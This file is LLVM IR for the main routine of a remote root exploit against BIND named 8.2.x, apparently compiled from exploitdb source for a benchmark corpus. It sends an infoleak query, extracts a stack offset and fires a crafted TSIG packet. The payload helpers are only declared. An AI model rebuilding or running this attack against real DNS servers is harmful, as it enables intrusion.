; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_282.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_282.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i8* }
%struct.TYPE_2__ = type { i64 }
%struct.sockaddr = type { i32 }

@BUFFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [67 x i8] c"[*] named 8.2.x (< 8.2.3-REL) remote root exploit by lucysoft, Ix\0A\00", align 1
@.str.1 = private unnamed_addr constant [59 x i8] c"[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"[*] usage : %s host\0A\00", align 1
@.str.3 = private unnamed_addr constant [51 x i8] c"[x] unable to resolve %s, try using an IP address\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"[*] attacking %s (%d.%d.%d.%d)\0A\00", align 1
@AF_INET = common dso_local global i8* null, align 8
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [30 x i8] c"[d] infoleak_qry was %d long\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c"[*] unable to send iquery\0A\00", align 1
@.str.7 = private unnamed_addr constant [37 x i8] c"[x] unable to receive iquery answer\0A\00", align 1
@.str.8 = private unnamed_addr constant [26 x i8] c"[*] iquery resp len = %d\0A\00", align 1
@.str.9 = private unnamed_addr constant [33 x i8] c"[*] retrieved stack offset = %x\0A\00", align 1
@.str.10 = private unnamed_addr constant [31 x i8] c"[x] error sending tsig packet\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 8
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  %15 = alloca [4 x i8], align 1
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* @BUFFSIZE, align 4
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %9, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %10, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.1, i64 0, i64 0))
  store i64 0, i64* %8, align 8
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %25, label %30

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* %28)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

30:                                               ; preds = %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i64 @resolve_host(i8* %33)
  store i64 %34, i64* %8, align 8
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %41, label %36

36:                                               ; preds = %30
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.3, i64 0, i64 0), i8* %39)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

41:                                               ; preds = %30
  %42 = getelementptr inbounds [4 x i8], [4 x i8]* %15, i64 0, i64 0
  %43 = call i32 @memcpy(i8* %42, i64* %8, i32 4)
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = getelementptr inbounds [4 x i8], [4 x i8]* %15, i64 0, i64 0
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = getelementptr inbounds [4 x i8], [4 x i8]* %15, i64 0, i64 1
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = getelementptr inbounds [4 x i8], [4 x i8]* %15, i64 0, i64 2
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = getelementptr inbounds [4 x i8], [4 x i8]* %15, i64 0, i64 3
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i8* %46, i32 %49, i32 %52, i32 %55, i32 %58)
  br label %60

60:                                               ; preds = %41
  %61 = load i8*, i8** @AF_INET, align 8
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i8* %61, i8** %62, align 8
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* @SOCK_DGRAM, align 4
  %66 = call i32 @socket(i8* %64, i32 %65, i32 0)
  store i32 %66, i32* %7, align 4
  %67 = icmp sgt i32 0, %66
  br i1 %67, label %68, label %69

68:                                               ; preds = %60
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

69:                                               ; preds = %60
  %70 = load i8*, i8** @AF_INET, align 8
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i8* %70, i8** %71, align 8
  %72 = call i32 @htons(i32 53)
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %72, i32* %73, align 8
  %74 = load i64, i64* %8, align 8
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %76 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %75, i32 0, i32 0
  store i64 %74, i64* %76, align 8
  %77 = call i32 @infoleak_qry(i8* %20)
  store i32 %77, i32* %11, align 4
  %78 = load i32, i32* %11, align 4
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0), i32 %78)
  %80 = load i32, i32* %7, align 4
  %81 = load i32, i32* %11, align 4
  %82 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %83 = call i32 @sendto(i32 %80, i8* %20, i32 %81, i32 0, %struct.sockaddr* %82, i32 24)
  store i32 %83, i32* %11, align 4
  %84 = load i32, i32* %11, align 4
  %85 = icmp slt i32 %84, 0
  br i1 %85, label %86, label %88

86:                                               ; preds = %69
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

88:                                               ; preds = %69
  store i32 24, i32* %14, align 4
  %89 = load i32, i32* %7, align 4
  %90 = load i32, i32* @BUFFSIZE, align 4
  %91 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %92 = call i32 @recvfrom(i32 %89, i8* %20, i32 %90, i32 0, %struct.sockaddr* %91, i32* %14)
  store i32 %92, i32* %11, align 4
  %93 = load i32, i32* %11, align 4
  %94 = icmp slt i32 %93, 0
  br i1 %94, label %95, label %97

95:                                               ; preds = %88
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

97:                                               ; preds = %88
  %98 = load i32, i32* %11, align 4
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.8, i64 0, i64 0), i32 %98)
  %100 = load i32, i32* %11, align 4
  %101 = call i64 @xtract_offset(i8* %20, i32 %100)
  store i64 %101, i64* %13, align 8
  %102 = load i64, i64* %13, align 8
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.9, i64 0, i64 0), i64 %102)
  %104 = load i64, i64* %13, align 8
  %105 = call i32 @evil_query(i8* %20, i64 %104)
  store i32 %105, i32* %11, align 4
  %106 = load i32, i32* %11, align 4
  %107 = icmp slt i32 %106, 0
  br i1 %107, label %108, label %110

108:                                              ; preds = %97
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

110:                                              ; preds = %97
  %111 = load i32, i32* %7, align 4
  %112 = load i32, i32* %11, align 4
  %113 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %114 = call i32 @sendto(i32 %111, i8* %20, i32 %112, i32 0, %struct.sockaddr* %113, i32 24)
  %115 = load i32, i32* %7, align 4
  %116 = call i64 @close(i32 %115)
  %117 = icmp sgt i64 0, %116
  br i1 %117, label %118, label %119

118:                                              ; preds = %110
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

119:                                              ; preds = %110
  %120 = call i32 @connection(%struct.sockaddr_in* byval(%struct.sockaddr_in) align 8 %6)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %121

121:                                              ; preds = %119, %118, %108, %95, %86, %68, %36, %25
  %122 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %122)
  %123 = load i32, i32* %3, align 4
  ret i32 %123
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @resolve_host(i8*) #2

declare dso_local i32 @memcpy(i8*, i64*, i32) #2

declare dso_local i32 @socket(i8*, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @infoleak_qry(i8*) #2

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @recvfrom(i32, i8*, i32, i32, %struct.sockaddr*, i32*) #2

declare dso_local i64 @xtract_offset(i8*, i32) #2

declare dso_local i32 @evil_query(i8*, i64) #2

declare dso_local i64 @close(i32) #2

declare dso_local i32 @connection(%struct.sockaddr_in* byval(%struct.sockaddr_in) align 8) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
